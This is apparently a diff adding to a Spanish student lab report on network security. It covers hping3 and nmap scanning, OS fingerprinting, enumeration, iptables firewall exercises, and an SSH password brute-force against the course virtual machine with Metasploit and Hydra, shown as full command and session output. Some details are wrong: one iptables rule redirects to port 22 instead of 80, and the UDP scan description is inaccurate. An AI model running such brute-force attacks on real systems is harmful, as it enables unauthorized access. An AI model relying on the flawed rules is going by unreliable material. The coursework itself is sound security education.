@@ -207,6 +207,357 @@ Nmap done: 1 IP address (1 host up) scanned in 0.57 seconds
 \textbf{hping3 -c 3 -S -p 80 localhost}: en la salida del analizador de protocolos se observa que el host responde con la bandera de \texttt{reset}. Indicando que el puerto está cerrado. En este caso se realiza un escaneo de tipo SYN. Ya que sólo se envía un paquete con la bandera \texttt{SYN}, imitando el inicio de una conexión.
 
 
+\textbf{hping3 -c 3 -S -p 113 localhost}: en la salida del analizador de protocolos observamos un comportamiento similar al del inciso anterior. El puerto se encuentra cerrado y por lo tanto responde con la bandera de \texttt{reset} en 1
+
+
+\textbf{hping3 -c 3 -2 127.0.0.1 -p 631}: se observa que el puerto 631, usado para \texttt{internet printing} se encuentra cerrado. En este caso, el método de escaneo de puertos utilizado, debido a que UDP es un protocolo carente de estado consiste en el envío de un paquete ICMP, considerando la respuesta de un \texttt{icmp port unreachable} como que el puerto se encuentra cerrado. Si el puerto no responde se considera abierto, lo cual no sucede en este caso.
+
+\textbf{hping3 -c 3 -2 127.0.0.1 -p 53}: como con el inciso anterior el puerto responde con un \texttt{icmp port unreachable}, indicando que el puerto se encuentra cerrado.
+
+
+\subsubsection*{IDLE Scan}
+
+Para la realización de IDLE scan el equipo a utilizar como zombie debe tener poco tráfico e IPID predecibles.
+
+\section*{Fingerprinting}
+
+El Fingerprinting es una técnica de recolección de información de un equipo para su identificación. Dentro de las cualidades de las que se pueden hacen fingerprinting se encuentra el Sistema Operativo. Descubrir el Sistema Operativo, en especial su versión, de un equipo puede servir para saber qué posibles fallas de seguridad posee y sus formas de explotarlas.
+
+En mi maquina local, dentro de la red de mi casa, levanto la máquina virtual provista por la cátedra, una segunda máquina virtual con Windows 7 y corre el comando
+
+\begingroup
+    \fontsize{9pt}{10pt}\selectfont
+\begin{lstlisting}[breaklines=true]
+Starting Nmap 7.70 ( https://nmap.org ) at 2018-10-24 01:31 -03
+Nmap scan report for 192.168.0.1
+Host is up (0.0034s latency).
+Not shown: 955 filtered ports, 44 closed ports
+PORT   STATE SERVICE
+80/tcp open  http
+MAC Address: 00:21:27:E7:81:04 (Tp-link Technologies)
+Device type: media device|broadband router|general purpose
+Running: VBrick embedded, Westell embedded, Wind River VxWorks
+OS CPE: cpe:/h:vbrick:4300 cpe:/h:westell:wirespeed_6100 cpe:/o:windriver:vxworks
+OS details: VBrick 4300 video encoder, Westell WireSpeed Dual Connect 6100 DSL router, VxWorks
+Network Distance: 1 hop
+
+Nmap scan report for 192.168.0.101
+Host is up (0.00064s latency).
+All 1000 scanned ports on 192.168.0.101 are closed
+MAC Address: 08:00:27:A1:B6:E6 (Oracle VirtualBox virtual NIC)
+Too many fingerprints match this host to give specific OS details
+Network Distance: 1 hop
+
+Nmap scan report for 192.168.0.102
+Host is up (0.00058s latency).
+Not shown: 999 filtered ports
+PORT     STATE SERVICE
+5357/tcp open  wsdapi
+MAC Address: 08:00:27:10:26:4E (Oracle VirtualBox virtual NIC)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose|phone
+Running: Microsoft Windows 2008|8.1|7|Phone|Vista
+OS CPE: cpe:/o:microsoft:windows_server_2008::beta3 cpe:/o:microsoft:windows_server_2008 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_7::-:professional cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1
+OS details: Microsoft Windows Server 2008 or 2008 Beta 3, Microsoft Windows Server 2008 R2 or Windows 8.1, Microsoft Windows 7 Professional or Windows 8, Microsoft Windows 8.1 R1, Microsoft Windows Phone 7.5 or 8.0, Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7, Microsoft Windows Vista SP2, Windows 7 SP1, or Windows Server 2008
+Network Distance: 1 hop
+
+Nmap scan report for 192.168.0.103
+Host is up (0.00013s latency).
+Not shown: 998 closed ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+5432/tcp open  postgresql
+Device type: general purpose
+Running: Linux 3.X
+OS CPE: cpe:/o:linux:linux_kernel:3
+OS details: Linux 3.7 - 3.10
+Network Distance: 0 hops
+
+OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 256 IP addresses (4 hosts up) scanned in 19.26 seconds
+    
+\end{lstlisting}
+\endgroup
+
+Vemos que responde correctamente en el caso de las máquinas virtual, pero al llegar a la máquina virtual vemos que indica que \texttt{Too many fingerprints match this host to give specific OS details}, dando a entender que la información que recabó del host no le permitió dar con una cantidad reducida de identidades para asignarle.
+
+Otra versión de este tipo de fingerprinting es la de realizarlo con servicios, en lugar del Sistema Operativo. Debido a que un servicio también sirve de puerta de entrada a un equipo a través de la red, creería que en ocasiones siendo una oportunidad más posible de llevar adelante. Este tipo de fingerprint se puede realizar a través de banner grabbing, pero no es la única forma, podemos realizar un ping sweeping a lo largo de puertos bien conocidos que querramos inspeccionar en caso de encontrar un servicio que podamos usar de puerta de entrada.
+
+\section*{Enumeración}
+
+La \textbf{enumaración} es una técnica por la cual se obtiene un listado de usuarios, dispositivos o hosts presentes en una red. Este procedimiento se puede realizar de diversas maneras, dependiendo del medio físico utilizado en la red.
+
+\begin{itemize}
+    \item Wifi: para enumerar las redes wifi presentes en la facultad bastaría con realizar una consulta al adaptador de red, para que provea el SSID e intensidad de cada red que está detectando. También nos interesa saber el nivel de seguridad que poseen.
+    \item Bluetooth: Utilizando el adaptador podemos saber la cantidad y qué dispositivos Bluetooth se encuentran presentes en la red.
+    \item Recursos presentes en una red windows: Dentro de una red de windwos, la enumeración se puede realizar, primero habilitando la detección de redes y de recursos compartidos de nuestro equipo y luego en la pestaña de red del explorador se mostaran los distitos recursos alcanzables por nuestro equipo.
+    \item Información de DNS de algún dominio en particular: Realizando consultas bien dirigidad al servidor. Esta técnica considero que puede ser fácilmente detectable como maliciosa, ya que al realizar algunas consultas en cierto orden se vuelve casi aparente que el usuario no es bien intencionado.
+\end{itemize}
+
+Al intentar realizar una enumeración DNS utilizando el dominio \texttt{unp.edu.ar} nos devuelve error, pero al intentarlo con \texttt{google.com} obtenemos lo especificado en el archivo \texttt{salida-dns-enum.xml} adjunto con el informe.
+
+\section*{Ataques de fuerza bruta}
+
+Demostramos un ataque por fuerza bruta sobre ssh en la máquina virtual provista por la cátedra
+
+\begingroup
+    \fontsize{8pt}{10pt}\selectfont
+\begin{lstlisting}[breaklines=true]
+msf > use auxiliary/scanner/
+Display all 540 possibilities? (y or n)
+msf > use auxiliary/scanner/ssh/ssh_login
+msf auxiliary(scanner/ssh/ssh_login) > set rhosts 192.168.0.101
+rhosts => 192.168.0.101
+msf auxiliary(scanner/ssh/ssh_login) > set pass_file /home/pablo/shared/badpasswords
+pass_file => /home/pablo/shared/badpasswords
+msf auxiliary(scanner/ssh/ssh_login) > set username defo
+username => defo
+msf auxiliary(scanner/ssh/ssh_login) > set stop_on_success true
+stop_on_success => true
+msf auxiliary(scanner/ssh/ssh_login) > exploit
+
+[+] 192.168.0.101:22 - Success: 'defo:defo1234' 'uid=1001(defo) gid=1001(defo) groups=1001(defo) Linux kali 4.9.0-kali3-amd64 #1 SMP Debian 4.9.18-1kali1 (2017-04-04) x86_64 GNU/Linux '
+[*] Command shell session 1 opened (192.168.0.103:45081 -> 192.168.0.101:22) at 2018-10-24 03:03:14 -0300
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf auxiliary(scanner/ssh/ssh_login) > sessions
+
+Active sessions
+===============
+
+  Id  Name  Type         Information                           Connection
+  --  ----  ----         -----------                           ----------
+  1         shell linux  SSH defo:defo1234 (192.168.0.101:22)  192.168.0.103:45081 -> 192.168.0.101:22 (192.168.0.101)
+
+msf auxiliary(scanner/ssh/ssh_login) > sessions -i 1
+[*] Starting interaction with 1...
+
+whoami
+defo
+uname -a
+Linux kali 4.9.0-kali3-amd64 #1 SMP Debian 4.9.18-1kali1 (2017-04-04) x86_64 GNU/Linux
+\end{lstlisting}
+\endgroup
+
+Utilizando la herramienta \texttt{Hydra-gtk} provista en la máquina virtual podemos realizar el mismo ataque, pero esta vez desde una ventana. La salida que devuelve es la siguiente:
+
+\begingroup
+    \fontsize{8pt}{10pt}\selectfont
+\begin{lstlisting}[breaklines=true]
+Hydra v8.3 (c) 2016 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2018-10-24 02:22:12
+[DATA] max 16 tasks per 1 server, overall 64 tasks, 21 login tries (l:1/p:21), ~0 tries per task
+[DATA] attacking service ssh on port 22
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[22][ssh] host: localhost   login: defo   password: defo1234
+1 of 1 target successfully completed, 1 valid password found
+Hydra (http://www.thc.org/thc-hydra) finished at 2018-10-24 02:22:14
+<finished>
+\end{lstlisting}
+\endgroup
+
+Vemos que la contraseña encontrada es la correcta y nos permite autenticarnos en la máquina virtual utilizando esas credenciales.
+
+\section*{Sección 3}
+
+\subsection*{Firewall}
+
+\begin{enumerate}
+    \item Se utilizó una política restrictiva
+    \item No son suficientes las reglas implementadas, pues no se acepta el acceso al equipo que tiene el servidor en el puerto 443, que es el puerto bien conocido para HTTPS.
+
+        Teniendo en cuenta que tampoco se están permitiendo que las conexiones ya establecidas con el puerto 80 se puedan mantener.
+
+        Para poder hacer lo que se está pidiendo deberían implementarse las siguientes reglas, además de las ya implementadas.
+
+\begin{lstlisting}[breaklines=true]
+iptables -A FORWARD -p tcp --dport 80 -d 200.10.11.2 -m state --state ESTABLISHED,RELATED -j ACCEPT
+iptables -A FORWARD -p tcp --dport 443 -d 200.10.11.2 -j ACCEPT
+iptables -A FORWARD -p tcp --dport 443 -m state --state ESTABLISHED,RELATED -j ACCEPT
+\end{lstlisting}
+
+De esta forma permite que desde internet se puedan realizar conexiones al servidor web y poder mantenerlas, tanto al puerto 80 como al 443.
+
+Siguiendo con el ejercicio, si además, desde la estación Y se quisiera realizar exitosamente un ping a google, se deberían agregar las siguientes reglas.
+
+\begin{lstlisting}[breaklines=true]
+iptables -A FORWARD -p icmp -s 200.10.11.100 -j ACCEPT
+iptables -A FORWARD -p icmp -m state --state ESTABLISHED,RELATED -j ACCEPT
+\end{lstlisting}
+
+Lo cual permite que las peticiones icmp salientes de Y puedan pasar y luego que circules los paqueted de conexiones ya establecidas bajo el protocolo icmp.
+\end{enumerate}
+
+\subsection*{Topología LAN}
+
+
+Armamos al topología descrita en el enunciado y listamos la configuración de cada nodo
+
+\begingroup
+    \fontsize{9pt}{10pt}\selectfont
+\begin{lstlisting}[language=bash,breaklines=true]
+# Nodo n1
+# ifconfig
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 10.0.0.10  netmask 255.255.255.0  broadcast 10.0.0.255
+        inet6 2001::10  prefixlen 64  scopeid 0x0<global>
+        inet6 fe80::200:ff:feaa:2  prefixlen 64  scopeid 0x20<link>
+        ether 00:00:00:aa:00:02  txqueuelen 1000  (Ethernet)
+        RX packets 26  bytes 2124 (2.1 KB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 13  bytes 1102 (1.1 KB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+# netstat -nr
+Kernel IP routing table
+Destination     Gateway         Genmask         Flags   MSS Window  irtt Iface
+0.0.0.0         10.0.0.1        0.0.0.0         UG        0 0          0 eth0
+10.0.0.0        0.0.0.0         255.255.255.0   U         0 0          0 eth0
+
+# netstat -natp
+# Servicios corriendo por TCP
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      28/sshd             
+tcp6       0      0 :::22                   :::*                    LISTEN      28/sshd  
+
+# netstat -naup
+# Servicios corriendo en UDP
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+
+# Nodo n2
+# ifconfig 
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 10.0.0.20  netmask 255.255.255.0  broadcast 10.0.0.255
+        inet6 fe80::200:ff:feaa:0  prefixlen 64  scopeid 0x20<link>
+        inet6 2001::20  prefixlen 64  scopeid 0x0<global>
+        ether 00:00:00:aa:00:00  txqueuelen 1000  (Ethernet)
+        RX packets 29  bytes 2414 (2.4 KB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 14  bytes 1172 (1.1 KB):w
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+# netsat -nr 
+Kernel IP routing table
+Destination     Gateway         Genmask         Flags   MSS Window  irtt Iface
+0.0.0.0         10.0.0.1        0.0.0.0         UG        0 0          0 eth0
+10.0.0.0        0.0.0.0         255.255.255.0   U         0 0          0 eth0
+
+
+# netstat -natp
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+
+# netstat -naup
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+
+# Nodo n3
+# ifconfig 
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 10.0.0.21  netmask 255.255.255.0  broadcast 10.0.0.255
+        inet6 2001::21  prefixlen 64  scopeid 0x0<global>
+        inet6 fe80::200:ff:feaa:1  prefixlen 64  scopeid 0x20<link>
+        ether 00:00:00:aa:00:01  txqueuelen 1000  (Ethernet)
+        RX packets 28  bytes 2304 (2.3 KB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 15  bytes 1242 (1.2 KB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+#netstat -nr
+Kernel IP routing table
+Destination     Gateway         Genmask         Flags   MSS Window  irtt Iface
+0.0.0.0         10.0.0.1        0.0.0.0         UG        0 0          0 eth0
+10.0.0.0        0.0.0.0         255.255.255.0   U         0 0          0 eth0
+
+# netstat -natp
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+
+# netstat -naup
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+
+\end{lstlisting}
+\endgroup
+
+Y al momento de correr por primera vez la topología, sin configuración previa, se observa la siguiente salidad de \texttt{iptables} en el server.
+
+\begingroup
+    \fontsize{9pt}{10pt}\selectfont
+\begin{lstlisting}
+# iptables -nL -v
+Chain INPUT (policy ACCEPT 0 packets, 0 bytes)
+ pkts bytes target     prot opt in     out     source               destination         
+
+Chain FORWARD (policy ACCEPT 0 packets, 0 bytes)
+ pkts bytes target     prot opt in     out     source               destination         
+
+Chain OUTPUT (policy ACCEPT 0 packets, 0 bytes)
+ pkts bytes target     prot opt in     out     source               destination         
+\end{lstlisting}
+\endgroup
+
+\subsubsection*{CASO 1}
+
+\texttt{Configure el firewall del Servidor Web para aceptar solamente conexiones al puerto 80 utilizando una política restrictiva.} 
+
+
+Para poder simular la existencia de un servidor web (puerto 80) haremos uso del comando ncat, con \\
+\texttt{ncat -l -p 80 -s <ip-servidor>} \\
+luego configuramos el firewall en el server:
+
+\begin{lstlisting}
+# Politica restrictiva
+iptables -P INPUT DROP
+# Aceptar solamente conexiones entrantes al puerto 80 en tcp
+iptables -A INPUT -p tcp --dport 80 -j ACCEPT
+\end{lstlisting}
+
+\subsubsection*{CASO 2}
+
+\texttt{Configure el firewall del Servidor Web para aceptar solamente conexiones al puerto 80 utilizando una política permisiva.} 
+
+\begin{lstlisting}
+# Politica permisiva
+iptables -P INPUT ACCEPT
+
+# Toda conexion que no sea para el puerto 80 debería ser descartada
+iptables -A INPUT --match multiport -p tcp --dports 23:65535 -j DROP 
+iptables -A INPUT --match multiport -p tcp --dports 0:21 -j DROP 
+\end{lstlisting}
+
+\subsubsection*{CASO 3}
+
+\texttt{Configure el firewall del Servidor Web para redireccionar toda petición al
+puerto TCP 8080 al puerto TCP 80 del mismo equipo}
+
+\begin{lstlisting}
+iptables -t nat -A PREROUTING -p tcp --dport 8080 -j REDIRECT --to-ports 22
+\end{lstlisting}
+
+\subsubsection*{CASO 4}
+
+\texttt{Configure el firewall del Cliente de modo que, para cualquiera de los puntos anteriores, el mismo pueda establecer hacia el Servidor cualquier tipo de \\comunicación (siempre y cuando el Servidor se lo permita), pero sin permitir que el Web Server pueda iniciar comunicaciones nuevas hacia él.}
+
+\begin{lstlisting}
+# Politica Restrictiva
+iptables -P OUTPUT DROP
+
+# Permitir conexiones hacia el servidor web pero no permitir que este
+# inicie conexiones con el cliente
+iptables -A OUTPUT --dst 10.0.0.10 -j ACCEPT
+iptables -A INPUT --src 10.0.0.10 -m state --state NEW -j DROP
+\end{lstlisting}
+
+\subsection*{Topología Ruteada}
+
+Armamos la topología planteada en el enunciado (respetando el nombre de cada nodo) y revisamos las configuraciones de red de cada nodo. 
+
+
+
 \pagebreak
 
 %-------------------------------------------------------------------------------
